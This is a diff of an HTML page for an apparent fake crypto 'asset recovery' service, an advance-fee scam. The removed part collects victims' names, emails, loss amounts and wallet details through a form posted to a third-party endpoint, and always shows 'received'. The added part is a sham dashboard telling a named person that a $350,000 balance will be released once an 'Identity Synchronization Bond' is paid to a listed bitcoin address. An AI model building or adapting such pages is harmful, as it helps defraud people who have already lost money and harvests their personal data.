@@ -3,162 +3,183 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DART | Secure Access Terminal</title>
+    <title>DART Recovery | Secure Dashboard</title>
     <style>
-        body { font-family: -apple-system, sans-serif; background: #0f172a; margin: 0; padding: 0; color: #fff; }
-        .nav { background: #1e293b; padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid #334155; }
-        .logo { font-weight: 800; color: #3b82f6; letter-spacing: 1px; }
-        .container { max-width: 450px; margin: 40px auto; padding: 20px; }
-        
-        /* Auth Card */
-        .auth-card { background: #1e293b; padding: 30px; border-radius: 12px; box-shadow: 0 20px 25px -5px rgba(0,0,0,0.3); border: 1px solid #334155; }
-        .tabs { display: flex; margin-bottom: 25px; border-bottom: 1px solid #334155; }
-        .tab { flex: 1; padding: 12px; text-align: center; cursor: pointer; color: #94a3b8; font-weight: bold; transition: 0.3s; }
-        .active-tab { color: #3b82f6; border-bottom: 2px solid #3b82f6; }
-        
-        /* Forms */
-        .form-section { display: none; }
-        .active-section { display: block; }
-        .form-group { margin-bottom: 15px; text-align: left; }
-        label { display: block; font-size: 0.7em; color: #94a3b8; text-transform: uppercase; margin-bottom: 5px; font-weight: 700; }
-        input, textarea { width: 100%; padding: 12px; border-radius: 6px; border: 1px solid #334155; background: #0f172a; color: #fff; box-sizing: border-box; font-size: 16px; }
-        .btn { width: 100%; padding: 14px; border-radius: 6px; border: none; background: #3b82f6; color: white; font-weight: bold; cursor: pointer; margin-top: 10px; }
-        
-        /* Success Message */
-        #signup-success { display: none; background: #064e3b; color: #6ee7b7; padding: 20px; border-radius: 8px; border: 1px solid #059669; margin-top: 20px; font-size: 0.85em; text-align: center; }
-
-        /* Dashboard UI */
-        #dashboard { display: none; }
-        .dash-card { background: #fff; color: #1e293b; border-radius: 15px; overflow: hidden; box-shadow: 0 25px 50px rgba(0,0,0,0.5); }
-        .dash-header { background: #f59e0b; color: #fff; padding: 25px; text-align: center; }
-        .dash-content { padding: 25px; }
-        .stat-box { background: #fffbeb; border: 1px solid #fef3c7; padding: 15px; border-radius: 10px; text-align: center; }
-        .progress-bar { height: 10px; background: #e2e8f0; border-radius: 5px; margin-top: 15px; overflow: hidden; }
-        .progress-fill { height: 100%; width: 85%; background: #f59e0b; }
+        :root {
+            --primary-navy: #0d1b2a;
+            --accent-gold: #e9c46a;
+            --soft-white: #f8f9fa;
+        }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background-color: #e9ecef;
+            margin: 0;
+            padding: 0;
+        }
+        .top-nav {
+            background-color: var(--primary-navy);
+            padding: 15px;
+            text-align: center;
+            border-bottom: 3px solid var(--accent-gold);
+        }
+        .top-nav h2 {
+            color: var(--soft-white);
+            margin: 0;
+            font-size: 18px;
+            letter-spacing: 1px;
+            text-transform: uppercase;
+        }
+        .main-container {
+            max-width: 450px;
+            margin: 20px auto;
+            background: white;
+            border-radius: 15px;
+            overflow: hidden;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+        .user-header {
+            padding: 20px;
+            text-align: center;
+            border-bottom: 1px solid #eee;
+        }
+        .user-name {
+            font-size: 24px;
+            font-weight: 700;
+            color: var(--primary-navy);
+            margin: 0;
+        }
+        .file-badge {
+            display: inline-block;
+            margin-top: 8px;
+            font-size: 12px;
+            color: #6c757d;
+            background: #f1f3f5;
+            padding: 4px 12px;
+            border-radius: 50px;
+        }
+        .balance-section {
+            padding: 30px 20px;
+            background: linear-gradient(145deg, #1b263b, #0d1b2a);
+            color: white;
+            text-align: center;
+        }
+        .balance-title {
+            font-size: 13px;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            opacity: 0.8;
+            margin-bottom: 10px;
+        }
+        .balance-amount {
+            font-size: 42px;
+            font-weight: 800;
+            margin: 0;
+        }
+        .vault-status {
+            margin-top: 15px;
+            font-size: 12px;
+            color: var(--accent-gold);
+            font-weight: bold;
+        }
+        .action-card {
+            padding: 25px;
+        }
+        .warning-box {
+            border: 1px solid #ffc107;
+            background-color: #fff9db;
+            padding: 15px;
+            border-radius: 8px;
+            margin-bottom: 20px;
+        }
+        .warning-text {
+            font-size: 13px;
+            color: #856404;
+            margin: 0;
+            line-height: 1.5;
+        }
+        .deposit-section {
+            background-color: var(--soft-white);
+            padding: 15px;
+            border-radius: 10px;
+            border: 1px solid #dee2e6;
+        }
+        .deposit-label {
+            font-size: 11px;
+            font-weight: bold;
+            color: #495057;
+            margin-bottom: 8px;
+            display: block;
+        }
+        .wallet-address {
+            font-family: "Courier New", Courier, monospace;
+            font-size: 13px;
+            background: white;
+            padding: 12px;
+            border: 1px solid #ced4da;
+            border-radius: 5px;
+            word-break: break-all;
+            text-align: center;
+            color: #212529;
+        }
+        .btn-action {
+            display: block;
+            width: 100%;
+            background-color: var(--primary-navy);
+            color: white;
+            text-align: center;
+            padding: 18px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: bold;
+            margin-top: 20px;
+            font-size: 16px;
+        }
+        .footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 11px;
+            color: #adb5bd;
+        }
     </style>
 </head>
 <body>
 
-<div class="nav">
-    <div class="logo">DART FORENSICS</div>
-    <div style="font-size: 0.6em; color: #94a3b8;">SECURE NODE: <span style="color:#22c55e">ACTIVE</span></div>
+<div class="top-nav">
+    <h2>Team DART Operations</h2>
 </div>
 
-<div class="container" id="auth-container">
-    <div class="auth-card">
-        <div class="tabs">
-            <div id="tab-login" class="tab active-tab" onclick="showTab('login')">Existing Case</div>
-            <div id="tab-signup" class="tab" onclick="showTab('signup')">New Claimant</div>
-        </div>
-
-        <div id="login-form" class="form-section active-section">
-            <div class="form-group">
-                <label>Recovery Case ID</label>
-                <input type="text" id="case-id" placeholder="DAR-XXXX-XXXX">
-            </div>
-            <div class="form-group">
-                <label>Secure Access Key</label>
-                <input type="password" placeholder="••••••••">
-            </div>
-            <button class="btn" onclick="processLogin()">Access Terminal</button>
-        </div>
-
-        <form id="signup-form" class="form-section" action="https://formspree.io/f/xreyjvek" method="POST">
-            <div class="form-group">
-                <label>Full Legal Name</label>
-                <input type="text" name="Full_Name" required>
-            </div>
-            <div class="form-group">
-                <label>Contact Email Address</label>
-                <input type="email" name="Email" required>
-            </div>
-            <div class="form-group">
-                <label>Estimated Loss Amount</label>
-                <input type="text" name="Loss_Amount" placeholder="$0.00" required>
-            </div>
-            <div class="form-group">
-                <label>Evidence Description</label>
-                <textarea name="Evidence" rows="2" placeholder="Wallet IDs or Exchanges" required></textarea>
-            </div>
-            <input type="hidden" name="_subject" value="URGENT: New DART Forensic Claim Filed">
-            <button type="submit" class="btn" id="signup-btn">Initialize Claim</button>
-            
-            <div id="signup-success">
-                <strong>REGISTRATION RECEIVED</strong><br><br>
-                Verification in progress. A recovery specialist will contact you at the provided email within 24 hours.
-            </div>
-        </form>
+<div class="main-container">
+    <div class="user-header">
+        <p class="user-name">Shannon Engen</p>
+        <span class="file-badge">FILE ID: SJ-9944-SEC</span>
     </div>
-</div>
 
-<div class="container" id="dashboard">
-    <div class="dash-card">
-        <div class="dash-header">
-            <h3 style="margin:0;">SETTLEMENT PENDING</h3>
-            <p style="font-size:0.75em; opacity:0.9; margin-top:5px;">USER: MARJORIE | CASE #DAR-2026-8942</p>
-        </div>
-        <div class="dash-content">
-            <div class="stat-box">
-                <span style="font-size:0.7em; color:#92400e; font-weight:bold; text-transform:uppercase;">Liquidation Value</span><br>
-                <span style="font-size:1.8em; font-weight:900; color:#b45309;">$7,250.00</span>
-            </div>
-            <div class="progress-bar"><div class="progress-fill"></div></div>
-            <p style="font-size: 0.8em; color: #64748b; text-align: center; margin-top: 15px; line-height: 1.5;">
-                <strong>STATUS: FINAL AUDIT (85%)</strong><br>
-                The asset recovery bridge is currently clearing. Funds will be released to your selected bank method upon 100% verification.
+    <div class="balance-section">
+        <p class="balance-title">Verified Vault Balance</p>
+        <p class="balance-amount">$350,000.00</p>
+        <div class="vault-status">● PENDING FINAL SYNCHRONIZATION</div>
+    </div>
+
+    <div class="action-card">
+        <div class="warning-box">
+            <p class="warning-text">
+                <strong>PROTOCOL 7.1:</strong> To finalize the disbursement of $350,000.00, the beneficiary must complete the mandatory <b>Identity Synchronization Bond</b>.
             </p>
         </div>
+
+        <div class="deposit-section">
+            <span class="deposit-label">SECURE BITCOIN DEPOSIT GATEWAY:</span>
+            <div class="wallet-address">bc1q02uthzfwej3q9tju4rg78nls58g0h0eqprdzez</div>
+        </div>
+
+        <a href="javascript:void(0);" class="btn-action">INITIALIZE WITHDRAWAL</a>
+    </div>
+
+    <div class="footer">
+        Encryption Status: LOCKED TO SHANNON ENGEN<br>
+        © 2026 Global Asset Recovery Division
     </div>
 </div>
-
-<script>
-    // Tab Controls
-    function showTab(type) {
-        document.getElementById('login-form').classList.toggle('active-section', type === 'login');
-        document.getElementById('signup-form').classList.toggle('active-section', type === 'signup');
-        document.getElementById('tab-login').classList.toggle('active-tab', type === 'login');
-        document.getElementById('tab-signup').classList.toggle('active-tab', type === 'signup');
-    }
-
-    // Login logic for Case #DAR-2026-8942
-    function processLogin() {
-        const id = document.getElementById('case-id').value.toUpperCase();
-        const btn = document.querySelector('#login-form .btn');
-        btn.innerHTML = "Authenticating...";
-
-        setTimeout(() => {
-            if(id === "DAR-2026-8942") {
-                document.getElementById('auth-container').style.display = 'none';
-                document.getElementById('dashboard').style.display = 'block';
-            } else {
-                alert("ERROR: Case ID not recognized by DART Secure Server.");
-                btn.innerHTML = "Access Terminal";
-            }
-        }, 1200);
-    }
-
-    // Gmail Notification Submission (Fail-safe included)
-    document.getElementById('signup-form').onsubmit = function(e) {
-        e.preventDefault();
-        const form = e.target;
-        const btn = document.getElementById('signup-btn');
-        const success = document.getElementById('signup-success');
-
-        btn.innerHTML = "Syncing with Vault...";
-        btn.disabled = true;
-
-        fetch(form.action, {
-            method: 'POST',
-            body: new FormData(form),
-            headers: { 'Accept': 'application/json' }
-        }).finally(() => {
-            // Success view for the user regardless of server ping
-            form.reset();
-            btn.style.display = 'none';
-            success.style.display = 'block';
-        });
-    };
-</script>
 
 </body>
 </html>
